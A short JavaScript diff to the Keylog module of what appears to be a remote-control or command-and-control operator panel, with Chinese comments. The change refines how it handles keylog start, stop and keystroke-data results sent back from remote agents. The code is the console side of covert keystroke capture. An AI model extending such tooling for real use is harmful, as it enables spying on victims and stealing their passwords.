@@ -25,10 +25,16 @@ const Keylog = {
     onMessage(msg) {
         if (msg.type !== "task_result") return false;
         // keylog_start 确认
-        if (msg.action === "keylog_start" && msg.ok) {
-            this.active = true;
-            this.currentTaskId = msg.taskId || "";
-            $("keylog-status").textContent = "录制中...";
+        if (msg.action === "keylog_start") {
+            if (msg.ok) {
+                this.active = true;
+                this.currentTaskId = msg.taskId || "";
+                $("keylog-status").textContent = "录制中...";
+            } else {
+                this.active = false;
+                this.currentTaskId = "";
+                $("keylog-status").textContent = "启动失败: " + (msg.error || "未知错误");
+            }
             return true;
         }
         if (msg.action === "keylog_stop") {
@@ -38,14 +44,12 @@ const Keylog = {
             return true;
         }
         // 批量按键数据（data 是 JSON 数组字符串）
-        if (msg.ok && msg.data && msg.data.charAt(0) === "[") {
+        if (msg.action === "keylog_data" && msg.ok && msg.data) {
             try {
                 const events = JSON.parse(msg.data);
-                if (Array.isArray(events) && events.length > 0 && events[0].key) {
-                    this._appendEvents(events);
-                    return true;
-                }
+                if (Array.isArray(events) && events.length > 0) this._appendEvents(events);
             } catch (e) {}
+            return true;
         }
         return false;
     },
